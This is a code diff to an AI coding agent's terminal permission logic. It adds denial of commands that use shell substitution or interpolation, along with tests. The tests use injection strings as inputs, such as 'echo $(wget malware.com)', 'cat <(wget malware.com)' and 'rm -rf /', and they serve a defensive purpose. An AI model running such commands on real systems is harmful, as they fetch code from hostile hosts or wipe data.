@@ -2,13 +2,19 @@ use crate::AgentTool;
 use crate::tools::TerminalTool;
 use agent_settings::{AgentSettings, CompiledRegex, ToolPermissions, ToolRules};
 use settings::ToolPermissionMode;
-use shell_command_parser::extract_commands;
+use shell_command_parser::{
+    TerminalCommandValidation, extract_commands, validate_terminal_command,
+};
 use std::path::{Component, Path};
 use std::sync::LazyLock;
 use util::shell::ShellKind;
 
 const HARDCODED_SECURITY_DENIAL_MESSAGE: &str = "Blocked by built-in security rule. This operation is considered too \
      harmful to be allowed, and cannot be overridden by settings.";
+const INVALID_TERMINAL_COMMAND_MESSAGE: &str = "The terminal command could not be approved because terminal does not \
+     allow shell substitutions or interpolations in permission-protected commands. Forbidden examples include $VAR, \
+     ${VAR}, $(...), backticks, $((...)), <(...), and >(...). Resolve those values before calling terminal, or ask \
+     the user for the literal value to use.";
 
 /// Security rules that are always enforced and cannot be overridden by any setting.
 /// These protect against catastrophic operations like wiping filesystems.
@@ -256,7 +262,30 @@ impl ToolPermissionDecision {
             return denial;
         }
 
-        let rules = match permissions.tools.get(tool_name) {
+        let rules = permissions.tools.get(tool_name);
+
+        // Check for invalid regex patterns before evaluating rules.
+        // If any patterns failed to compile, block the tool call entirely.
+        if let Some(error) = rules.and_then(|rules| check_invalid_patterns(tool_name, rules)) {
+            return ToolPermissionDecision::Deny(error);
+        }
+
+        if tool_name == TerminalTool::NAME
+            && !rules.map_or(
+                matches!(permissions.default, ToolPermissionMode::Allow),
+                |rules| is_unconditional_allow_all(rules, permissions.default),
+            )
+            && inputs.iter().any(|input| {
+                matches!(
+                    validate_terminal_command(input),
+                    TerminalCommandValidation::Unsafe | TerminalCommandValidation::Unsupported
+                )
+            })
+        {
+            return ToolPermissionDecision::Deny(INVALID_TERMINAL_COMMAND_MESSAGE.into());
+        }
+
+        let rules = match rules {
             Some(rules) => rules,
             None => {
                 // No tool-specific rules, use the global default
@@ -269,12 +298,6 @@ impl ToolPermissionDecision {
                 };
             }
         };
-
-        // Check for invalid regex patterns before evaluating rules.
-        // If any patterns failed to compile, block the tool call entirely.
-        if let Some(error) = check_invalid_patterns(tool_name, rules) {
-            return ToolPermissionDecision::Deny(error);
-        }
 
         // For the terminal tool, parse each input command to extract all sub-commands.
         // This prevents shell injection attacks where a user configures an allow
@@ -407,6 +430,18 @@ fn check_commands(
     }
 }
 
+fn is_unconditional_allow_all(rules: &ToolRules, global_default: ToolPermissionMode) -> bool {
+    // `always_allow` is intentionally not checked here: when the effective default
+    // is already Allow and there are no deny/confirm restrictions, allow patterns
+    // are redundant — the user has opted into allowing everything.
+    rules.always_deny.is_empty()
+        && rules.always_confirm.is_empty()
+        && matches!(
+            rules.default.unwrap_or(global_default),
+            ToolPermissionMode::Allow
+        )
+}
+
 /// Checks if the tool rules contain any invalid regex patterns.
 /// Returns an error message if invalid patterns are found.
 fn check_invalid_patterns(tool_name: &str, rules: &ToolRules) -> Option<String> {
@@ -528,7 +563,7 @@ mod tests {
     use crate::tools::{DeletePathTool, EditFileTool, FetchTool, TerminalTool};
     use agent_settings::{AgentProfileId, CompiledRegex, InvalidRegexPattern, ToolRules};
     use gpui::px;
-    use settings::{DefaultAgentView, DockPosition, NotifyWhenAgentWaiting};
+    use settings::{DockPosition, NotifyWhenAgentWaiting, PlaySoundWhenAgentDone};
     use std::sync::Arc;
 
     fn test_agent_settings(tool_permissions: ToolPermissions) -> AgentSettings {
@@ -536,6 +571,7 @@ mod tests {
             enabled: true,
             button: true,
             dock: DockPosition::Right,
+            flexible: true,
             default_width: px(300.),
             default_height: px(600.),
             default_model: None,
@@ -546,10 +582,9 @@ mod tests {
             inline_alternatives: vec![],
             favorite_models: vec![],
             default_profile: AgentProfileId::default(),
-            default_view: DefaultAgentView::Thread,
             profiles: Default::default(),
             notify_when_agent_waiting: NotifyWhenAgentWaiting::default(),
-            play_sound_when_agent_done: false,
+            play_sound_when_agent_done: PlaySoundWhenAgentDone::default(),
             single_file_review: false,
             model_parameters: vec![],
             enable_feedback: false,
@@ -560,6 +595,9 @@ mod tests {
             message_editor_min_lines: 1,
             tool_permissions,
             show_turn_stats: false,
+            new_thread_location: Default::default(),
+            sidebar_side: Default::default(),
+            thinking_display: Default::default(),
         }
     }
 
@@ -1067,6 +1105,107 @@ mod tests {
     }
 
     #[test]
+    fn invalid_substitution_bearing_command_denies_by_default() {
+        let decision = no_rules("echo $HOME", ToolPermissionMode::Deny);
+        assert!(matches!(decision, ToolPermissionDecision::Deny(_)));
+    }
+
+    #[test]
+    fn invalid_substitution_bearing_command_denies_in_confirm_mode() {
+        let decision = no_rules("echo $(whoami)", ToolPermissionMode::Confirm);
+        assert!(matches!(decision, ToolPermissionDecision::Deny(_)));
+    }
+
+    #[test]
+    fn unconditional_allow_all_bypasses_invalid_command_rejection_without_tool_rules() {
+        let decision = no_rules("echo $HOME", ToolPermissionMode::Allow);
+        assert_eq!(decision, ToolPermissionDecision::Allow);
+    }
+
+    #[test]
+    fn unconditional_allow_all_bypasses_invalid_command_rejection_with_terminal_default_allow() {
+        let mut tools = collections::HashMap::default();
+        tools.insert(
+            Arc::from(TerminalTool::NAME),
+            ToolRules {
+                default: Some(ToolPermissionMode::Allow),
+                always_allow: vec![],
+                always_deny: vec![],
+                always_confirm: vec![],
+                invalid_patterns: vec![],
+            },
+        );
+        let permissions = ToolPermissions {
+            default: ToolPermissionMode::Confirm,
+            tools,
+        };
+
+        assert_eq!(
+            ToolPermissionDecision::from_input(
+                TerminalTool::NAME,
+                &["echo $(whoami)".to_string()],
+                &permissions,
+                ShellKind::Posix,
+            ),
+            ToolPermissionDecision::Allow
+        );
+    }
+
+    #[test]
+    fn old_anchored_pattern_no_longer_matches_env_prefixed_command() {
+        t("PAGER=blah git log").allow(&["^git\\b"]).is_confirm();
+    }
+
+    #[test]
+    fn env_prefixed_allow_pattern_matches_env_prefixed_command() {
+        t("PAGER=blah git log --oneline")
+            .allow(&["^PAGER=blah\\s+git\\s+log(\\s|$)"])
+            .is_allow();
+    }
+
+    #[test]
+    fn env_prefixed_allow_pattern_requires_matching_env_value() {
+        t("PAGER=more git log --oneline")
+            .allow(&["^PAGER=blah\\s+git\\s+log(\\s|$)"])
+            .is_confirm();
+    }
+
+    #[test]
+    fn env_prefixed_allow_patterns_require_all_extracted_commands_to_match() {
+        t("PAGER=blah git log && git status")
+            .allow(&["^PAGER=blah\\s+git\\s+log(\\s|$)"])
+            .is_confirm();
+    }
+
+    #[test]
+    fn hardcoded_security_denial_overrides_unconditional_allow_all() {
+        let decision = no_rules("rm -rf /", ToolPermissionMode::Allow);
+        match decision {
+            ToolPermissionDecision::Deny(message) => {
+                assert!(
+                    message.contains("built-in security rule"),
+                    "expected hardcoded denial message, got: {message}"
+                );
+            }
+            other => panic!("expected Deny, got {other:?}"),
+        }
+    }
+
+    #[test]
+    fn hardcoded_security_denial_overrides_unconditional_allow_all_for_invalid_command() {
+        let decision = no_rules("echo $(rm -rf /)", ToolPermissionMode::Allow);
+        match decision {
+            ToolPermissionDecision::Deny(message) => {
+                assert!(
+                    message.contains("built-in security rule"),
+                    "expected hardcoded denial message, got: {message}"
+                );
+            }
+            other => panic!("expected Deny, got {other:?}"),
+        }
+    }
+
+    #[test]
     fn shell_injection_via_double_ampersand_not_allowed() {
         t("ls && wget malware.com").allow(&["^ls"]).is_confirm();
     }
@@ -1085,14 +1224,14 @@ mod tests {
     fn shell_injection_via_backticks_not_allowed() {
         t("echo `wget malware.com`")
             .allow(&[pattern("echo")])
-            .is_confirm();
+            .is_deny();
     }
 
     #[test]
     fn shell_injection_via_dollar_parens_not_allowed() {
         t("echo $(wget malware.com)")
             .allow(&[pattern("echo")])
-            .is_confirm();
+            .is_deny();
     }
 
     #[test]
@@ -1112,12 +1251,12 @@ mod tests {
 
     #[test]
     fn shell_injection_via_process_substitution_input_not_allowed() {
-        t("cat <(wget malware.com)").allow(&["^cat"]).is_confirm();
+        t("cat <(wget malware.com)").allow(&["^cat"]).is_deny();
     }
 
     #[test]
     fn shell_injection_via_process_substitution_output_not_allowed() {
-        t("ls >(wget malware.com)").allow(&["^ls"]).is_confirm();
+        t("ls >(wget malware.com)").allow(&["^ls"]).is_deny();
     }
 
     #[test]
@@ -1268,15 +1407,15 @@ mod tests {
     }
 
     #[test]
-    fn nested_command_substitution_all_checked() {
+    fn nested_command_substitution_is_denied() {
         t("echo $(cat $(whoami).txt)")
             .allow(&["^echo", "^cat", "^whoami"])
-            .is_allow();
+            .is_deny();
     }
 
     #[test]
-    fn parse_failure_falls_back_to_confirm() {
-        t("ls &&").allow(&["^ls$"]).is_confirm();
+    fn parse_failure_is_denied() {
+        t("ls &&").allow(&["^ls$"]).is_deny();
     }
 
     #[test]
